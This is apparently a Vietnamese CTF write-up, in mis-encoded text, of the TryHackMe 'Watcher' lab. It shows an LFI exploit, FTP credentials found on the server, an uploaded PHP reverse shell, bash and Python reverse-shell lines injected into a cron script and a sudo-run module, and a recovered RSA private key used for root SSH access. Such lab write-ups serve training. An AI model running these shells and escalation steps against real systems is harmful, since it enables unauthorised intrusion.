22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR | 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y= | 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Jekyll v4.1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Corkplacemats Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Flag 1 # Truy cáº­p vÃ o web service vá»›i port 80\nPhÃ¢n tÃ­ch qua vá» trang web nÃ y thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c robots.txt, truy cáº­p vÃ o path nÃ y vÃ  tÃ´i cÃ³ flag Ä‘áº§u tiÃªn\nUser-agent: * Allow: /flag_1.txt Allow: /secret_file_do_not_read.txt â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# curl http://10.10.80.186/flag_1.txt FLAG{robots_dot_text_what_is_next} Flag 2 # Vá»›i file sá»‘ 2 thÃ¬ tÃ´i khÃ´ng truy cáº­p Ä‘Æ°á»£c. PhÃ¢n tÃ­ch qua source web\n\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card mb-4 shadow-sm\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;post.php?post=striped.php\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/placemat1.jpg\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;225\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;This placemat has a beautiful striped pattern, both pleasing for the eye and functional.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;d-flex justify-content-between align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;btn-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-sm btn-outline-secondary\u0026#34;\u0026gt;View\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;small class=\u0026#34;text-muted\u0026#34;\u0026gt;2 mins\u0026lt;/small\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card mb-4 shadow-sm\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;post.php?post=round.php\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/placemat2.jpg\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;225\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;This placemat is round! Crazy, huh? What\u0026#39;s next, an octagon placemat? Haha, hahahah\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;d-flex justify-content-between align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;btn-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-sm btn-outline-secondary\u0026#34;\u0026gt;View\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;small class=\u0026#34;text-muted\u0026#34;\u0026gt;9 mins\u0026lt;/small\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card mb-4 shadow-sm\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;post.php?post=bunch.php\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/placemat3.jpg\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;225\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;This one has a whole bunch of placemats. You\u0026#39;re basically spoiled for choice here. Be grateful.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;d-flex justify-content-between align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;btn-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-sm btn-outline-secondary\u0026#34;\u0026gt;View\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; á» pháº§n trÃªn cÃ³ thá»ƒ tháº¥y path post.php?post= khÃ¡ giá»‘ng vá»›i lá»— há»•ng LFI\nTÃ´i sáº½ thá»­ má»Ÿ file trÃªn báº±ng cÃ¡ch nÃ y\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# curl http://10.10.80.186/post.php?post=secret_file_do_not_read.txt \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; ... \u0026lt;main role=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-8\u0026#34;\u0026gt; Hi Mat, The credentials for the FTP server are below. I\u0026#39;ve set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/main\u0026gt; Truy cáº­p ftp vá»›i port 21\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ftp 10.10.80.186 Connected to 10.10.80.186. 220 (vsFTPd 3.0.3) Name (10.10.80.186:kali): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||45370|) 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Dec 03 2020 files -rw-r--r-- 1 0 0 21 Dec 03 2020 flag_2.txt 226 Directory send OK. ftp\u0026gt; get flag_2.txt /home/kali/flag2.txt local: /home/kali/flag2.txt remote: flag_2.txt 229 Entering Extended Passive Mode (|||40425|) 150 Opening BINARY mode data connection for flag_2.txt (21 bytes). 100% |****************************************************************************************************************************************************************************************************************| 21 19.38 KiB/s 00:00 ETA 226 Transfer complete. 21 bytes received in 00:00 (0.09 KiB/s) â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# cat flag2.txt FLAG{ftp_you_and_me} RCE # Flag 3 # Quay láº¡i ftp má»™t chÃºt thÃ¬ tÃ´i cÃ²n cÃ³ 1 folder tÃªn files bÃªn trong. Váº­y thÃ¬ tÃ´i cÃ³ thá»ƒ táº£i RCE lÃªn Ä‘Ã³ vÃ  má»Ÿ nÃ³ trÃªn web\nVÃ¬ web dÃ¹ng php nÃªn tÃ´i sáº½ sá»­ dá»¥ng PentestMonkey shell cho Ä‘Æ¡n giáº£n.\nTáº¡o file revshell.php, sao chÃ©p toÃ n bá»™ code RCE vá», lÆ°u nÃ³ láº¡i vÃ  táº£i nÃ³ lÃªn ftp\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ftp 10.10.80.186 Connected to 10.10.80.186. 220 (vsFTPd 3.0.3) Name (10.10.80.186:kali): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; put revshell.php local: revshell.php remote: revshell.php 229 Entering Extended Passive Mode (|||49612|) 150 Ok to send data. 100% |********************************************************************************| 2593 9.40 MiB/s 00:00 ETA 226 Transfer complete. 2593 bytes sent in 00:00 (5.91 KiB/s) ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||40158|) 150 Here comes the directory listing. -rw-r--r-- 1 1001 1001 2593 Jul 28 10:42 revshell.php 226 Directory send OK. ftp\u0026gt; Táº¡o listener vá»›i port 9001\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... Truy cáº­p RCE vá»›i web\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ curl http://10.10.80.186/post.php?post=../../../home/ftpuser/ftp/files/revshell.php Quay láº¡i listener vÃ  tÃ´i cÃ³ shell\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 54208 Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:45:44 up 54 min, 0 users, load average: 0.00, 0.00, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (942): Inappropriate ioctl for device bash: no job control in this shell www-data@watcher:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@watcher:/$ BÃ¢y giá» thÃ¬ viá»‡c tÃ¬m cÃ¡c flag sáº½ Ä‘Æ¡n giáº£n hÆ¡n. Vá»›i flag sá»‘ 3 tÃ´i cÃ³ thá»ƒ dÃ¹ng cÃ¡ch sau\nwww-data@watcher:/home$ find / -type f -name flag_3.txt 2\u0026gt;/dev/null find / -type f -name flag_3.txt 2\u0026gt;/dev/null /var/www/html/more_secrets_a9f10a/flag_3.txt www-data@watcher:/home$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt cat /var/www/html/more_secrets_a9f10a/flag_3.txt FLAG{lfi_what_a_guy} www-data@watcher:/home$ Privilege escalation # Flag 4 # Tiáº¿p tá»¥c phÃ¢n tÃ­ch mÃ¡y nÃ y báº±ng cÃ¡c lá»‡nh Ä‘Æ¡n giáº£n, tÃ´i cÃ³ sudo -l\nwww-data@watcher:/tmp$ sudo -l sudo -l Matching Defaults entries for www-data on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on watcher: (toby) NOPASSWD: ALL Äiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ chuyá»ƒn sang user toby mÃ  khÃ´ng cáº§n khai bÃ¡o password\nwww-data@watcher:/tmp$ sudo -u toby bash sudo -u toby bash id uid=1003(toby) gid=1003(toby) groups=1003(toby) VÃ  tÃ´i cÃ³ flag sá»‘ 4\ncd /home/toby cat flag_4.txt FLAG{chad_lifestyle} Flag 5 # á» user toby tÃ´i cÃ³ thÃªm 1 file txt vÃ  1 folder khÃ¡c\nid uid=1003(toby) gid=1003(toby) groups=1003(toby) ls flag_4.txt jobs note.txt note.txt\ncat note.txt Hi Toby, I\u0026#39;ve got the cron jobs set up now so don\u0026#39;t worry about getting that done. Mat /jobs\nls jobs cow.sh cat jobs/cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg Kiá»ƒm tra crontab\ncat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # */1 * * * * mat /home/toby/jobs/cow.sh Váº­y lÃ  tiáº¿n trÃ¬nh nÃ y cho user mat cháº¡y file cow.sh, mÃ  toby Ä‘ang sá»Ÿ há»¯u file nÃ y, nghÄ©a lÃ  toby cÃ³ quyá»n chá»‰nh sá»­a nÃ³. TÃ´i sáº½ thÃªm shell vÃ o cow.sh Ä‘á»ƒ khi nÃ³ Ä‘Æ°á»£c cháº¡y theo lá»‹ch, tÃ´i sáº½ chiáº¿m Ä‘Æ°á»£c quyá»n cá»§a mat\nTrÆ°á»›c Ä‘Ã³ thÃ¬ tÃ´i pháº£i táº¡o listener Ä‘Ã£\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 4444 listening on [any] 4444 ... Quay láº¡i shell\npwd /home/toby cd jobs echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.105.194/4444 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; cow.sh cat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.105.194/4444 0\u0026gt;\u0026amp;1\u0026#34; Chá» má»™t lÃºc Ä‘á»ƒ cron lÃ m viá»‡c cá»§a nÃ³\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 4444 listening on [any] 4444 ... connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 35940 bash: cannot set terminal process group (2572): Inappropriate ioctl for device bash: no job control in this shell mat@watcher:~$ id id uid=1002(mat) gid=1002(mat) groups=1002(mat) mat@watcher:~$ VÃ  tÃ´i cÃ³ flag sá»‘ 5\nmat@watcher:~$ pwd pwd /home/mat mat@watcher:~$ ls ls cow.jpg flag_5.txt note.txt scripts mat@watcher:~$ cat flag_5.txt cat flag_5.txt FLAG{live_by_the_cow_die_by_the_cow} mat@watcher:~$ Flag 6 # á» Ä‘Ã¢y tÃ´i láº¡i cÃ³ thÃªm 1 file txt vÃ  1 folder\nnote.txt\nmat@watcher:~$ cat note.txt cat note.txt Hi Mat, I\u0026#39;ve set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe. Will /scripts\nmat@watcher:~$ ls scripts ls scripts cmd.py will_script.py mat@watcher:~$ cat scripts/cmd.py cat scripts/cmd.py def get_command(num): if(num == \u0026#34;1\u0026#34;): return \u0026#34;ls -lah\u0026#34; if(num == \u0026#34;2\u0026#34;): return \u0026#34;id\u0026#34; if(num == \u0026#34;3\u0026#34;): return \u0026#34;cat /etc/passwd\u0026#34; mat@watcher:~$ cat scripts/will_script.py cat scripts/will_script.py import os import sys from cmd import get_command cmd = get_command(sys.argv[1]) whitelist = [\u0026#34;ls -lah\u0026#34;, \u0026#34;id\u0026#34;, \u0026#34;cat /etc/passwd\u0026#34;] if cmd not in whitelist: print(\u0026#34;Invalid command!\u0026#34;) exit() os.system(cmd) Vá»›i note phÃ­a trÃªn, tÃ´i thá»­ sudo -l\nmat@watcher:~$ sudo -l sudo -l Matching Defaults entries for mat on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mat may run the following commands on watcher: (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py * Äiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ cháº¡y file will_script.py báº±ng user will mÃ  khÃ´ng cáº§n khai bÃ¡o password. NhÃ¬n vÃ o ná»™i dung bÃªn trÃªn thÃ¬ will_script.py sáº½ import cmd.py lÃ m thÆ° viá»‡n. Váº­y thÃ¬ tÃ´i sáº½ thÃªm shell vÃ o cmd.py Ä‘á»ƒ will_script.py thá»±c thi nÃ³\nShell tÃ´i sá»­ dá»¥ng\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.14\u0026#34;,5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); Thay Ä‘á»•i ip vÃ  port\nmat@watcher:~/scripts$ echo \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.105.194\u0026#34;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt;\u0026gt; cmd.py \u0026lt;(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt;\u0026gt; cmd.py Táº¡o listener vá»›i port 6666\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 6666 listening on [any] 6666 ... Thá»±c thi\nmat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1 Quay láº¡i listener\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 6666 listening on [any] 6666 ... connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 56418 will@watcher:~/scripts$ id id uid=1000(will) gid=1000(will) groups=1000(will),4(adm) will@watcher:~/scripts$ cd /home/will cd /home/will will@watcher:/home/will$ ls ls flag_6.txt will@watcher:/home/will$ cat flag_6.txt cat flag_6.txt FLAG{but_i_thought_my_script_was_secure} will@watcher:/home/will$ SSH # Flag 7 # TÃ´i khÃ´ng cÃ²n dÃ¹ng Ä‘Æ°á»£c sudo -l ná»¯a vÃ¬ cáº§n password. Tuy nhiÃªn tÃ´i Ä‘á»ƒ Ã½ tháº¥y user will thuá»™c group adm. TÃ´i sáº½ tÃ¬m cÃ¡c file thuá»™c group nÃ y\nwill@watcher:/home/will$ find / -type f -group adm 2\u0026gt;/dev/null find / -type f -group adm 2\u0026gt;/dev/null /opt/backups/key.b64 /var/log/auth.log /var/log/kern.log /var/log/syslog /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log /var/log/cloud-init.log /var/log/unattended-upgrades/unattended-upgrades-dpkg.log /var/log/apt/term.log CÃ³ 1 file key á»Ÿ Ä‘Ã¢y\nwill@watcher:/home/will$ cat /opt/backups/key.b64 cat /opt/backups/key.b64 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45 ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3 YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5 cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3 c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2 TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2 TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0 bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4 NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4 STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= NÃ³ Ä‘Ã£ Ä‘Æ°á»£c mÃ£ hÃ³a base64. Pháº£i thÃªm 1 bÆ°á»›c decode ná»¯a\nwill@watcher:/home/will$ cat /opt/backups/key.b64 | base64 -d cat /opt/backups/key.b64 | base64 -d -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4 jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI 9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6 1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5 fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2 Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE 7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1 vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0 mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh /6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5 4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA== -----END RSA PRIVATE KEY----- Sao chÃ©p key nÃ y vá» mÃ¡y vÃ  login ssh\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh -i id_rsa 10.10.80.186 The authenticity of host \u0026#39;10.10.80.186 (10.10.80.186)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:/60sf9gTocupkmAaJjtQJTxW1ZnolBZckE6KpPiQi5s. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.80.186\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Jul 28 12:10:25 UTC 2023 System load: 0.0 Processes: 118 Usage of /: 22.5% of 18.57GB Users logged in: 0 Memory usage: 52% IP address for eth0: 10.10.80.186 Swap usage: 0% IP address for lxdbr0: 10.14.179.1 33 packages can be updated. 0 updates are security updates. Last login: Thu Dec 3 03:25:38 2020 root@watcher:~# root@watcher:~# id uid=0(root) gid=0(root) groups=0(root) root@watcher:~# cat /root/flag_7.txt FLAG{who_watches_the_watchers} root@watcher:~# ","date":"19 May 2022","externalUrl":null,"permalink":"/ctf/tryhackme/watcher/","section":"Ctf","summary":"","title":"Tryhackme - Watcher","type":"ctf"},{"content":"","date":"16 May 2022","externalUrl":null,"permalink":"/tags/cve-2015-1328/","section":"Tags","summary":"","title":"CVE-2015-1328","type":"tags"},{"content":"","date":"16 May 2022","externalUrl":null,"permalink":"/tags/gcc/","section":"Tags","summary":"","title":"Gcc","type":"tags"},{"content":"","date":"16 May 2022","externalUrl":null,"permalink":"/tags/shellshock/","section":"Tags","summary":"","title":"Shellshock","type":"tags"},{"content":"TryHackMe - 0day\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 